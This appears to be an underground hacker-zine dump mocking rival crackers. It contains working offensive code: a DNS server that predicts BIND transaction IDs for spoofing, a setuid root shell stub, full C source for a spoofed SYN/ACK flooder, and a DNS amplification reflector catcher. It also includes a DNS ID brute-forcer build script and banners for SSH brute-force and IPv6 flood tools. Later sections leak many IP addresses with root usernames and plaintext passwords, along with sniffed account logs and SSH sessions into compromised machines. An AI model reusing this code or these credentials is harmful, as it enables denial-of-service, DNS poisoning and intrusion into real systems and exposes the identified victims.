    self.targets = []
    self.named_conf = []

    for i in xrange(len(_NAMED_CONF)):
      start = 0
      tmp = ''
      for j in xrange(len(_NAMED_CONF[i][0])):
        if _NAMED_CONF[i][0][j] == '.':
          tmp += chr(j - start)
          tmp += _NAMED_CONF[i][0][start:j]
          start = j + 1
      tmp += chr(j - start + 1)
      tmp += _NAMED_CONF[i][0][start:] + ""\x00""
      self.named_conf.append([tmp, _NAMED_CONF[i][1]])
    return

  def run(self):
    self.s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    self.s.bind(('',53))
    self.is_r.append(self.s)
    next = False
    i = 0

    while 1:
      r, w, e = select.select(self.is_r, self.is_w, self.is_e, 1.0)
      if r:
        try:
          data, addr = self.s.recvfrom(1024)
        except socket.error:
          continue

        txid = unpack("">H"", data[0:2])[0]
        p=DNSData(data)
        if p.name == None:
          continue

        found = False

        for j in xrange(len(self.named_conf)):
          if p.name == self.named_conf[j][0]:
            found = True
            break

        if found == True:
          self.s.sendto(p.response(self.named_conf[j][1]), addr)
          continue

        # FIXME: wrong code, 'i' is 0 at begin and when 1 item in list...
        for i in xrange(len(self.targets)):
          if self.targets[i][0] == addr[0]:
            break
        if i == len(self.targets):
          self.targets.append([addr[0], False, time.time(), [None, None], \
            None, 0, 0, 0])

        if self.targets[i][1] == False:
          bsp = BINDSimplePredict(txid)
          self.targets[i][1] = bsp.next
          self.targets[i][3][0] = bsp.cand
          bsp = BINDSimplePredict(txid, False)
          self.targets[i][3][1] = bsp.cand
        else:
          if p.name == self.targets[i][4]:
            elapsed = time.time() - self.targets[i][2]
            if elapsed > _ANSWER_TIME_LIMIT:
              print 'info: slow answer, discarding (%.2f sec)' % elapsed
            else:
              self.targets[i][5] += 1
              found_v1 = False
              found_v2 = False
              for j in xrange(10):
                if self.targets[i][3][0][j] == txid:
                  found_v1 = True
                  break
                if self.targets[i][3][1][j] == txid:
                  found_v2 = True
                  break

              if found_v1 == True or found_v2 == True:
                self.targets[i][6] += 1
              else:
                self.targets[i][7] += 1

              # TODO: if found_v1 or found_v2 is True, then show bind version!
              print ""\n"" + str(i) + ' target:', self.targets
              print '%f:%s:%d: id: %04x q: %d g: %d e: %d' % (time.time(), \
                addr[0], addr[1], txid, self.targets[i][5], \
                self.targets[i][6], self.targets[i][7])
              self.targets[i][1] = False
        self.targets[i][2] = time.time()
        self.targets[i][4] = ""\x01"" + ""x"" + p.name
        self.s.sendto(p.response(), addr)
    return

  def close(self):
    self.s.close()
    return

if __name__ == '__main__':
  dns_srv = DNSServer()

  try:
    dns_srv.run()
  except KeyboardInterrupt:
    print 'ctrl-c, leaving...'
    dns_srv.close()


         /\
         ||

((( PUBLIC SHIT )))


""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
""""````````COOOOOOOOOOOOOOOLLLL U KNOW SUID FILE!!!!!´´´´´´´´´´´""""


~\-> cd..; cat flw.c|more
int main(void) {
setgid(0); setuid(0);
execl(""/bin/sh"",""sh"",0); }

""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""

====================================================================
=                                                                  =
=   ,================================.                             =
=  /      _______    ___________      \                            =
= |  ##  | o   o |  |_|_|__|_|__|  ##  |                           =
= | #### |_,---._|           |||  #### |                           =
= |  ##        (o)  (O)+++   ##        |`--.__                     =
=  \__________________________________/ hjw   \,--[=               =
=    '='                           '='  `97                        =
=                                                                  =
====================================================================
=                                                                  =
=                                                                  =
=          OHHHHHHHHHHH U HAVE PACKET POWERRRRRRRRR ????           =
=                                                                  =
=======================================================================
=                                                                     =
=                                                                     =
= ~\-> ./l                                                            =
= [L]OTUS I. by LabSec [SYN/ACK Packet flooder]                       =
= Usage: ./l [source] [destination] [bport] [eport] [type] [timeout]  =
=                                                                     =
=  |                                                                  =
=  |-- source class/ip                           (0 = random)         =
=      destination host/ip                       (no default)         =
=      begin port                                (1-65535   )         =
=      end port                                  (1-65535   )         =
=      type [1:SYN, 2:ACK]                       (no default)         =
=       timeout                                   (no default)        =
=                                                                     =
=======================================================================
                      +                                                +
                        +                                                +
                          +                                                +
	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	+ 													 +
	+ ~\-> ./imp												 +
	+ imp.c (v.331) by sinkhole - Proof of Concept for private educational use only				 +
	+ -PRIVATE- REGISTERED FOR: pnt										 +
	+ 													 +
	+ WARNING: Using this program on public networks							 +
	+ is HIGHLY illegal and they WILL find you and put							 +
	+ you in jail. The author is no way responsible for							 +
	+ your actions. Keep this one to your local network!							 +
	+ 													 +
	+ Usage: ./imp <src ip block> <dst computer> <begin port> <end port> <type> [seconds to run for]	 +
	+     src ip block     = a block of computers, ie: 10.32.8 (put 0 for random)				 +
	+         -Note: random only works on misconfigured networks now-a-days.				 +
	+     dst computer     = computer to receive the packets.						 +
	+     begin port       = port to begin flooding, ie: 1							 +
	+     end port         = last port to flood, ie: 150							 +
	+     types            = 1=SYN 2=ACK 3=FIN 4=RST							 +
	+     seconds to run   = If not specified it will run until killed.					 +
	+ 													 +
	+ Ie: ./imp 10.223 10.2.0.1 1 150 1 30									 +
	+ 													 +
	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++



\-> cat lotus.c|more
/*
[L]OTUS.C by labsec team
*/

#include <signal.h>
#include <stdio.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

unsigned long rend, stawp;
int pkttype, datapipe;
time_t startt, endt;
char version[5];

void die()
{
  unsigned long ks;
  int temp;
  endt=time(0);
  temp=(endt - startt);
  if(temp == 0)
    temp=1;
  ks=((rend * 54) / temp);
  fprintf(stderr, ""    %d packets sent in %d seconds\n"", rend, (endt-startt), (ks / 1024));
  fprintf(stderr, ""    %d kbyte/s\n"", (ks / 1024));
  alarm(0);
  exit(1);
}

void usage(char *program) {
  fprintf(stderr, ""[L]OTUS I. by LabSec [SYN/ACK Packet flooder]\n"");
  fprintf(stderr, ""Usage: %s [source] [destination] [bport] [eport] [type] [timeout]\n"", program);
  fprintf(stderr, ""\n"");
  fprintf(stderr, "" |\n"");
  fprintf(stderr, "" |-- source class/ip                           (0 = random)\n"");
  fprintf(stderr, ""     destination host/ip                       (no default)\n"");
  fprintf(stderr, ""     begin port                                (1-65535   )\n"");
  fprintf(stderr, ""     end port                                  (1-65535   )\n"");
  fprintf(stderr, ""     type [1:SYN, 2:ACK]                       (no default)\n"");
  fprintf(stderr, ""     timeout                                   (no default)\n"");
  fprintf(stderr, ""\n"");

  exit(1);
}

unsigned short ip_sum (addr, len) u_short *addr;
int len;
{
  register int nleft = len;
  register u_short *w = addr;
  register int sum = 0;
  u_short answer = 0;
  while (nleft > 1)
  {
    sum += *w++;
    nleft -= 2;
  }
  if (nleft == 1)
  {
    *(u_char *) (&answer) = *(u_char *) w;
    sum += answer;
  }
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  answer = ~sum;
  return (answer);
}

unsigned long getaddr(char *name) {
  struct hostent *hep;
hep=gethostbyname(name);
  if(!hep) {
    fprintf(stderr, ""unknown host %s\n"", name);
    exit(1);
  }
  return *(unsigned long *)hep->h_addr;
}

void send_tcp_pkt(struct ip *ih, struct tcphdr *th, char *data, int dlen) {
  char buf[65536];
  struct {
    unsigned long saddr, daddr;
    char mbz;
    char ptcl;
    unsigned short tcpl;
  } ph;

  struct sockaddr_in sin;
  ph.saddr=ih->ip_src.s_addr;
  ph.daddr=ih->ip_dst.s_addr;
  ph.mbz=0;
  ph.ptcl=IPPROTO_TCP;
  ph.tcpl=htons(sizeof(*th)+dlen);
  memcpy(buf, &ph, sizeof(ph));
  memcpy(buf+sizeof(ph), th, sizeof(*th));
  memcpy(buf+sizeof(ph)+sizeof(*th), data, dlen);
  memset(buf+sizeof(ph)+sizeof(*th)+dlen, 0, 4);
  th->th_sum=ip_sum(buf, (sizeof(ph)+sizeof(*th)+dlen+1)&~1);
  memcpy(buf, ih, 4*ih->ip_hl);
  memcpy(buf+4*ih->ip_hl, th, sizeof(*th));
  memcpy(buf+4*ih->ip_hl+sizeof(*th), data, dlen);
  memset(buf+4*ih->ip_hl+sizeof(*th)+dlen, 0, 4);
  ih->ip_sum=ip_sum(buf, (4*ih->ip_hl + sizeof(*th)+ dlen + 1) & ~1);
  memcpy(buf, ih, 4*ih->ip_hl);
  sin.sin_family=AF_INET;
  sin.sin_port=th->th_dport;
  sin.sin_addr.s_addr=ih->ip_dst.s_addr;
  if(sendto(datapipe, buf, 4*ih->ip_hl+sizeof(*th)+dlen, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
    printf(""Error sending packet.\n""); perror("""");
    exit(1);
  }
}

unsigned long make_tcp_pkt(unsigned long their_ip, unsigned short port, unsigned long woop, unsigned long spewf) {
  int i, s, c, nignog;
  struct ip ih;
  struct tcphdr th;
  struct sockaddr_in sin;
  int sinsize;
  unsigned short myport=6969;
  char buf[1];
  struct timeval tv;
  srandom(time(NULL)+woop-1);
  ih.ip_v=4;
  ih.ip_hl=5;
  ih.ip_tos=0;
  ih.ip_len=sizeof(ih)+sizeof(th);
  ih.ip_id=htons(random()+woop-3);
  ih.ip_off=0;
  ih.ip_ttl=255;
  ih.ip_p=IPPROTO_TCP;
  ih.ip_sum=0;
  if(spewf==0)
    ih.ip_src.s_addr=random()+getpid()+woop+3;
  else
    ih.ip_src.s_addr=spewf;
  ih.ip_dst.s_addr=their_ip;
  th.th_sport=htons(random()+getpid()+woop);
  th.th_dport=htons(port);
  th.th_seq=0;
  th.th_off=sizeof(th)/4;
  th.th_ack=(random()+woop-1);
  switch(pkttype)
  {
    case 1:
      th.th_flags = 0x02;
    case 2:
      th.th_flags = 0x10;
    case 3:
      th.th_flags = 0x01;
    case 4:
      th.th_flags = 0x04;
    case 5:
      th.th_flags = 0x20;
    case 6:
      th.th_flags = 0x08;
    default:
      die;
  }
  th.th_win=(random()+woop-2);
  th.th_sum=0;
  th.th_urp=1;
  send_tcp_pkt(&ih, &th, NULL, 0);
}


void main(int argc, char *argv[]) {
  int i, x, diff, stawp=0;
  unsigned long them, me_fake;
  unsigned lowport, highport;
  int ret, w, j, a, b, c, d;
  int randspoof=0;
  unsigned char blk[3], *p;
  char nukesrc[128];
  struct {
    int one;
    int two;
    int three;
  } orig;

 strcpy(version, ""v"");strcat(version, ""."");strcat(version, ""4"");
  strcat(version, ""0"");strcat(version, ""3"");
  signal(SIGINT, die);signal(SIGQUIT, die);signal(SIGKILL, die);
  signal(SIGTERM, die);signal(SIGSTOP, die);
  rend=0;
  a=0;b=0;c=0;d=0;
  if(argc<6) {
    usage(argv[0]);
  }
  them=getaddr(argv[2]);
  lowport=atoi(argv[3]);
  highport=atoi(argv[4]);
  pkttype=atoi(argv[5]);
  if(pkttype!=1 && pkttype!=2 && pkttype!=3 && pkttype!=4 && pkttype!=5 && pkttype!=6)
    usage(argv[0]);
  if(argc==7) {
    stawp=atoi(argv[6]);
  }
  datapipe=socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if(datapipe<0) {
    perror(""socket (raw)"");
    exit(1);
  }
  i = 1;
  diff = (highport - lowport);
  if (diff > -1)
    {
  for (p = argv[1], ret = 0; *p; *p++) {
    if (*p == '.')
      ret++;
    if (ret > 2) {
      printf(""Invalid block.\n"");
      exit(-1);
    }
  }
  if((ret == 0)&&(atoi(argv[1])==0))
    randspoof=1;
  p = argv[1]; d = 0;

 for (w = 0; w < ret + 1; w++) {
     memset((char *)blk, 0, 3);

    for (j = 0; *p; *p++) {
         if (*p == '.')
            break;
         blk[j++] = *p;
     }

    if (w == 0)
        a = atoi(blk);
     if (w == 1)
        b = atoi(blk);
     if (w == 2)
        c = atoi(blk);
     *p++;
  }
  orig.one=a;
  orig.two=b;
  orig.three=c;
  if(stawp > 0) {
     signal(SIGALRM, die);
     alarm(stawp);
  }
  startt=time(0);
  while(1) {
     for (x=lowport;x<=highport;x++) {
     if(randspoof == 0) {
     if (d > 255) {
      if (c < 255) {
         c++;
         if((ret == 2) && (orig.three != c))
           c=orig.three;
         d = 0;
      } else {
        if (b < 255) {
            b++;
        if((ret == 1) && (orig.two != b))
              b=orig.two;
            c = 0;
            d = 0;
         } else {
           if (a < 255) {
             a++;
             if((ret == 0) && (orig.one != a))
               a=orig.one;
             b = 0;
             c = 0;
             d = 0;
           } else {
             break;
             d=0;
           }
           }
          }
       }
       sprintf(nukesrc, ""%d.%d.%d.%d"", a, b, c, d);
       me_fake=getaddr(nukesrc);
       make_tcp_pkt(them, x, rend, me_fake);
       d++;
       } else {
       make_tcp_pkt(them, x, rend, 0);
       }
       rend++;
    }
    }
  } else {
    usage(argv[0]);
    exit(1);
  }
}

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

					!!!!!!!!!!!!!!!!!!!!
					!!! MGN u R AXED !!!
					!!!!!!!!!!!!!!!!!!!!


				~\-> ./mcd
				++ magnum catch (v1.3)                  ++
				+  magnum(11:2004)                       +

				./mcd <time> <port>
				   <time> : amount of time to listen
				   <port> : port to listen on
				
								
				(m) .;magnum(2004);.


!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!


~\-> cat mcd.c|more
/*
        (cid@magnum:11/2003)



        magnum-catch-ns v1.1,v1.2

        want to add a list checker
        making fopen use append...
        cleaned things up a bit, made it nicer , added port cmd line opt.


        magnum-catch-ns v1.0

        catch 'certain sized' replies from name servers

        to use this, i just use magnum-dns (md-*) to ""attack"" the host
        running this program. I hit it for about 1 - 5 seconds and watch
        for the replies. Replies which are bigger than  a defined length,
        get logged into the defined output file.

                                                                -cid
        test function on md attack to sends packets to random addresses.
        the victim ip will be the ip of the server running this program.
        log all ips with reply above 500bytes

*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <string.h>
#include <sys/fcntl.h>
#include <termios.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <arpa/nameser.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <time.h>

#define OUT_FILE  ""new.list""    /* file to put good ips in        */
#define KEEP_SIZE 2500          /* only keep replies greater than */
#define DISPLAY_TIME 3          /* display stats every x seconds  */

struct sockaddr_in s_in;



int main(int argc, char *argv[])
{
        char buf[8192], addr[256];
        int s, sd, len, on = 1, port, length;
        long county = 0, count = 0, ssize = 0, scount = 0;
        long int size = 0;
        long xtime, stime;
        long ip;
        struct sockaddr_in client, serv;
        FILE *fd;

        printf(""++ magnum catch (v1.3)                  ++\n"");
        printf(""+  magnum(11:2004)                       +\n"");
        printf(""\n"");

        if (argc < 3)
        {
                printf(""%s <time> <port>\n"", argv[0]);
                printf(""   <time> : amount of time to listen\n"");
                printf(""   <port> : port to listen on\n"");
                printf(""\n\n(m) .;magnum(2004);.\n"");
                exit(0);
        }
        port = atoi(argv[2]);
        xtime = time(NULL);     stime = (time(NULL) + DISPLAY_TIME);

        fd = fopen(OUT_FILE, ""a"");

        serv.sin_family=AF_INET;
        serv.sin_port=htons(port);
        serv.sin_addr.s_addr=htonl(INADDR_ANY);

        if ((sd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
                perror(""socket"");
                exit(-1);
        }
        fcntl(sd, F_SETFL, O_NONBLOCK);
        bind(sd, (struct sockaddr *) &serv,sizeof(serv));

        len = sizeof(client);

        printf(""(m) port %i -/- %i seconds.\n"", port, atoi(argv[1]));

        while(1)
        {
                if (time(NULL) >= (xtime + atoi(argv[1])))
                        break;

                if (time(NULL) >= stime)
                {
/*
                        printf(""(m) good(%u) -/- %u Kbyte/s @ %u
PPS.\n"", \
                                county, (ssize / DISPLAY_TIME / 1024), \
                                (scount / DISPLAY_TIME));
*/
                        ssize = 0;      scount = 0;
                        stime = (stime + DISPLAY_TIME);
                }

                length = recvfrom(sd, buf, sizeof(buf), 0, \
                        (struct sockaddr *)&client, &len);

                if (length != -1 && length != 0)
                {
                        size    += length;      ssize   += length;
                        count++;                scount++;

                        if (length >= KEEP_SIZE)
                        {
//                              printf(""recv len: %i\n"", length);
                                county  += 1;

                                sprintf(addr, ""%s\n"", \
                                        inet_ntoa(client.sin_addr));
                                fputs(addr, fd);
                        }
                }

        }

        fclose(fd);

        printf(""(m) total ips kept        : %u ips\n"", county);
        printf(""(m) total data received   : %lu bytes\n"", size);
        printf(""(m) total packets received: %u packets\n"", count);
        printf(""(m) keep size             : %i bytes\n"", KEEP_SIZE);

        printf(""\n\n(m) .;magnum(2004);.\n"");
        return(0);
}




!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!




~\-> ls;cat mk
./  ../  libmdns/  libmutil/  mk*  ps.h
#!/bin/sh

OS=`uname`
ARCH=`uname -m`

if [ $OS = ""SunOS"" ]; then
        MG_OPT=""-lsocket -lnsl -ldl""
fi

if [ $OS = ""IRIX"" ]; then
        MG_OPT=""-lsocket -lnsl -ldl""
fi

CC=""gcc""
ILIBS=""libmutil/libmutil*.a libmdns/libmdns.a""
SRCS=""monoxide.c""
OUTPUTFILE=""mxide3""

rm -f $OUTPUTFILE

echo ""(mGn) monoxide v1.7, dns id brute forcing, repeat requests.""
echo
echo ""  -> OS     : $OS :: $ARCH""
echo ""  -> OPT    : $CC $MG_OPT""
echo ""  -> FILES  : $SRCS""
echo ""  -> LIBS   : $ILIBS""
echo ""  -> EXEC   : $OUTPUTFILE""
echo

rm *.core >/dev/null 2>/dev/null

echo -n ""(mGn) building libmutil: ""
        cd libmutil;     ./mk >/dev/null 2>/dev/null;           cd ..
echo ""Done.""

echo -n ""(mGn) building libmdns: ""
        cd libmdns;      ./mk >/dev/null 2>/dev/null;           cd ..
echo ""Done.""


echo ""(mGn) building, linking mOnOxIDe(v1.7): ""
echo """"
echo ""$CC -o $OUTPUTFILE $MG_OPT $ENABLE_SWAP $SRCS $ILIBS""
echo """"
$CC -o $OUTPUTFILE $MG_OPT $ENABLE_SWAP $SRCS $ILIBS
echo ""(mGn) Done.""
strip $OUTPUTFILE       ;       ls -l $OUTPUTFILE



!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!



==>> LABSEC BNC SHELLSSSSSSSSSSSSSSSSSS <<==

....

7h15 15 4 v3ry l337 gr0up, u51n9 s4m3 pwd 1n d1ff3r3n7 b0x5.. OFMGGGGGGGG

...

62.75.216.208:juca666 (root:e0d1b5ce) -- Linux alster204 2.6.8-24.16-smp #1 SMP Thu Jun 2 12:09:57 UTC 2005 i686 i686 i386 GNU/Linux
150.162.105.1:juca666 -- Linux gauss 2.6.11.4-21.10-default #1 Tue Nov 29 14:32:49 UTC 2005 i686 i686 i386 GNU/Linux  gauss.grima.ufsc.br
pam_from: 80.108.247.157        user: root      pass: e0d1b5ce
pam_from: 80.108.247.157        user: root      pass: e0d1b5ce
pam_from: 80.108.247.157        user: root      pass: e0d1b5ce
pam_from: 85.125.117.50         user: root      pass: e0d1b5ce
pam_from: 80.108.247.157        user: root      pass: e0d1b5ce

-----------------------------------------------------------------------------
128.192.0.46:juca666 -- OpenBSD moondog.uga.edu 3.3 GENERIC#44 i386



----------------------------------------------------------------------------------------
pass_from: ::ffff:66.252.13.131         user: root      pass: ch63@ut!
pass_from: ::ffff:64.215.27.94  user: root      pass: ch63@ut! -- CISCO
pass_from: ::ffff:206.104.155.161       user: root      pass: juca666 -- CISCO


root@mail.interop.net's password:juca666
---------------------------------------------------------------------
-bash-3.1# host 66.252.13.131
131.13.252.66.in-addr.arpa domain name pointer duff.darklogic.net.
131.13.252.66.in-addr.arpa domain name pointer gate.operations.net.
131.13.252.66.in-addr.arpa domain name pointer labsec.operations.net.
131.13.252.66.in-addr.arpa domain name pointer special.operations.net.
-bash-3.1# host 66.252.13.132
132.13.252.66.in-addr.arpa domain name pointer mosdef.darklogic.net.
132.13.252.66.in-addr.arpa domain name pointer fx.exploit.org.
132.13.252.66.in-addr.arpa domain name pointer md5.crypto.net.
132.13.252.66.in-addr.arpa domain name pointer duff.brasirc.org.
132.13.252.66.in-addr.arpa domain name pointer free.bsd.us.
132.13.252.66.in-addr.arpa domain name pointer mini.cat.
132.13.252.66.in-addr.arpa domain name pointer execl.exploit.org.
132.13.252.66.in-addr.arpa domain name pointer labsec.exploit.org.


~\-> cat lol|wc -l
328
~\-> cat lol|more
2to: 130.75.26.134      user: reuter    pass: ******* we cant show :)
2to: 130.75.26.134      user: reuter    pass: ******* we cant show :)
2to: 130.75.26.134      user: reuter    pass: ******* we cant show :)
2to: 130.75.26.134      user: reuter    pass: ******* we cant show :)
2to: 130.75.26.134      user: reuter    pass: ******* we cant show :)
2to: 18.38.1.121        user: reuter    pass: ******* we cant show :)
2to: 130.75.26.134      user: reuter    pass: ******* we cant show :)
2to: 130.75.26.134      user: reuter    pass: ******* we cant show :)
2to: 130.75.26.134      user: reuter    pass: ******* we cant show :)
2to: 18.38.1.121        user: reuter    pass: ******* we cant show :)
2to: 18.38.1.121        user: reuter    pass: ******* we cant show :)
2to: 18.7.16.69         user: reuter    pass: ******* we cant show :)
2to: 18.7.16.69         user: reuter    pass: ******* we cant show :)

** oh coooll!! log of some .edu boxs (FBI REALLY WILL LIKE YOU) sending........... wanted@fbi.gov


** moreeeeee......................

~\-> wc -l mit.edu
279 mit.edu

~\-> cat mit.edu|more
mit.edu
/usr/lib/pwlib/devices/libpng
2to: 18.58.1.76         user: root      pass: ******* we cant show :)
2to: 18.38.0.40         user: baker     pass: ******* we cant show :)
2to: 18.38.0.40         user: baker     pass: ******* we cant show :)
2to: 18.7.16.70         user: harishm   pass: ******* we cant show :)
2to: 18.7.16.70         user: harishm   pass: ******* we cant show :)
2to: 18.58.1.76         user: root      pass: ******* we cant show :)
2to: 18.38.0.40         user: baker     pass: ******* we cant show :)
2to: 18.38.0.203        user: modarres  pass: ******* we cant show :)


~\-> wc -l shells
5648 shells

OH MY GOD... REALLY REQUERSS EL8888888888 POKEMON !! 5648 SHELLSSS!!! BUT OWNED!! LOLLLLLLLLLLLL

2to: 212.202.219.21     user: root      pass: juca666
2to: 150.162.45.1       user: leeloo    pass: juca666
2to: 69.93.123.66       user: root      pass: juca666
2ito: 150.162.6.1       user: root      pass: juca666
2ito: 150.162.6.1       user: leeloo    pass: juca666
2to: 67.18.151.106      user: root      pass: juca666
2to: 69.93.78.178       user: root      pass: juca666
2ito: 205.234.198.3     user: root      pass: juca666
2to: 69.93.123.66       user: root      pass: juca666
2ito: 200.18.45.92      user: root      pass: juca666
2ito: 200.18.45.90      user: root      pass: juca666

........................
......................
....................
to be continued!! :))


++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


~\-> cd lpd; ./bridge

SSHBrute v1.4 - Tal0n [cyber_talon@hotmail.com] on 09-04-04
Usage: ./bridge -brute <hosts.txt> || -grab <ip> || -help


++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

// ipv6 flooder

# ./6
Usage: 6 [-6] ip4/6 [port] [delay (ms)] [times]

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++



~\->ssh 72.20.13.1 -l klux
klux@72.20.13.1's password:
Last login: Wed Aug 22 21:19:16 2007 from F 

sh-2.05$ uname -a

FreeBSD box.observers.net 6.1-RELEASE-p10 FreeBSD 6.1-RELEASE-p10 #7: Mon Oct 23 15:14:33 PDT 2006

checking logs of psybnc.......

Tue Aug 21 22:27:23 :(xbugs!bugs@67.43.224.204) [KICKED] from #!!!magnum (h4h4)

... kicked from magnum ? oh cool!!
ok... next...

===================================================================================================

\->ssh 72.20.13.13 -l klux
klux@72.20.13.13's password:
Last login: Wed Aug 22 21:19:16 2007 from F 

sh-2.05$ uname -a

FreeBSD box.observers.net 6.1-RELEASE-p10 FreeBSD 6.1-RELEASE-p10 #7: Mon Oct 23 15:14:33 PDT 2006 


# oh klux... very hard!!! u cant card dedicated servers!!!!!!!!

===================================================================================================

\->ssh 66.240.231.65 -l klux
klux@66.240.231.65's password:
Last login: Wed Aug 22 21:19:16 2007 from x0x0x.x0x0x.x0x0x.x0x0x

sh-2.05$ uname -a

Linux dlx1 2.6.8-3-686-smp #1 SMP Tue Dec 5 23:17:50 UTC 2006 i686 GNU/Linux


sh-2.05$ cat l4m4h.5n1ff|grep klux
****2ito: 72.20.13.1 	user: klux 	pass: xfera123 - FreeBSD box.observers.net 6.1-RELEASE-p10 FreeBSD 6.1-RELEASE-p10 #7: Mon Oct 23 15:14:33 PDT 2006
****2ito: 72.20.13.13 	user: klux 	pass: xfera123 - FreeBSD box.observers.net 6.1-RELEASE-p10 FreeBSD 6.1-RELEASE-p10 #7: Mon Oct 23 15:14:33 PDT 2006 
****2ito: 66.240.231.65 user: klux 	pass: bala123 - Linux dlx1 2.6.8-3-686-smp #1 SMP Tue Dec 5 23:17:50 UTC 2006 i686 GNU/Linux
****2ito: 88.198.51.138     user: klux      pass: bala123




???????????????????????????????????????
???? yeah klux , you are really 2ito!!!
????



+++++++++++++++++++++++++++++++++++++
+++++++++ PROOF OF CONCEPT ++++++++++
+++++++++++++++++++++++++++++++++++++


I will show now some of klux's b0x:

2ito: 69.90.99.196      user: root      pass: juca666 - Linux jeeves.voxter.ca 2.6.17-2-686 #1 SMP Thu Aug 31 12:53:18 UTC 2006 i686 GNU/Linux
****2ito: 65.39.152.239     user: root      pass: juca666 (n3wp4ss) - Linux white.metrobridge.net 2.6.11.7 #1 SMP Wed Apr 20 01:52:44 PDT 2005 i686 GNU/Linux
2to: 69.90.99.195       user: root      pass: juca666 - Linux donkey 2.6.18-4-686 #1 SMP Mon Mar 26 17:17:36 UTC 2007 i686 GNU/Linux
2to: 62.75.252.248 	user: root 	pass: juca666 - Linux server 2.4.21-303-athlon #1 Tue Dec 6 12:24:00 UTC 2005 i686 athlon i386 GNU/Linux
2ito: 66.119.169.249 	user: root 	pass: juca666 - Linux tunnel2.metrobridge.net 2.6.10 #1 Tue Feb 8 00:35:11 PST 2005 i686 GNU/Linux
!!2to: 74.221.128.90      user: root      pass: juca666 - Linux ns2.phx.metrobridge.net 2.6.18-4-486 #1 Wed Feb 21 15:25:16 UTC 2007 i686 GNU/Linux
2ito: 83.133.82.77 	user: root 	pass: juca666 - Linux rocoto067 2.6.16.1-amd-webperoni-06042006-1 #1 Thu Apr 6 17:01:51 CEST 2006 i686 athlon i386 GNU/Linux
2ito: 80.86.82.237 	user: root 	pass: juca666 - Linux q-serwer 2.6.15.4-amd #1 SMP Fri Feb 24 22:35:17 CET 2006 i686 athlon i386 GNU/Linux


   + This REQUER use default password as juca666! really one GOOOOOOOOOOOOOOOOOOOD admin... +

   + klux have approximately 6000 machines with juca666 password and others 2. +

   + next zine we will post all boxs with root password ;)



[[[.-.]]] serh the packet/bnc MAN! He´s el8 p0k3m0n [[[.-.]]]


\-> ssh 66.252.8.107 -l serh
serh@66.252.8.107's password:
Last login: Wed Sep  5 14:38:04 2007 from x0x0x.x0x0x.x0x0x.x0x0x
                    .__    .___             __  .__
                    |__| __| _/____   _____/  |_|__|__  ___
                    |  |/ __ |/ __ \ /    \   __\  \  \/  /
                    |  / /_/ \  ___/|   |  \  | |  |>    <
                    |__\____ |\___  >___|  /__| |__/__/\_ \
                            \/    \/     \/              \/
                                    welcome to identix

                          your friendly admins:
                                      phil: phil@identixonline.com
                                      rage: corefocus@gmail.com

This is a PRIVATE server. You are privilaged to even have an account on
this box. Do not abuse it, we will find out. ALL activity is monitored
and logged. DO NOT allow anyone other than yourself use your account on
this machine. If caught abusing the system, your account will be deleted
- no exceptions. If I find you hacking, packeting, using this as a dump
site, or anything else stupid, you will be banned for life and will have
your toenails pryed off with a flathead screwdriver. Oh and yeah, you
will also be prosecuted to the fullest extent of the law. Only if I'm
having a bad day. Basically don't fuck with us.

Now that we have all that clear enjoy our box and feel free to drop any
suggestions/comments to either rage or myself.

                                                - phil


                                -+ NEWS +-
2.12.07
Thanks to Rage our resources have been upgraded and we have a decent
amount of HD space and RAM.  We still ask that you be conservative with
our resources and not to abuse them.  If I find processes that are
hogging resources I will kill them and msg you regarding such processes.
If you continue to abuse the resources after we talk I will userdel and
not think twice about it. RESPECT IS EVERYTHING. THANKS RAGE!!

        -+ Commands :
        COMING SOON!!!! (I know I am a slacker)
        -+ 'vhosts' for a list of useable vhosts.
        -+ 'getegg' for eggdrop.
        -+ 'getbnc' for bnc.
        -+ 'BitchX' for irc client. *WORKING*
        -+  more to come ...

        Please note that you can review this motd at any time simply by
        typing the command 'motd'.


        * NO OUTBOUND IRC ACCESS ANYWHERE UNTIL WE CONFIGURE ALL IPS AND
DOMAINS. IF I CATCH ANY IRC PROCESS, I WILL KILL IT.

-RAGE

-bash: /dev/null: Permission denied
-bash: /dev/null: Permission denied
-bash: /dev/null: Permission denied
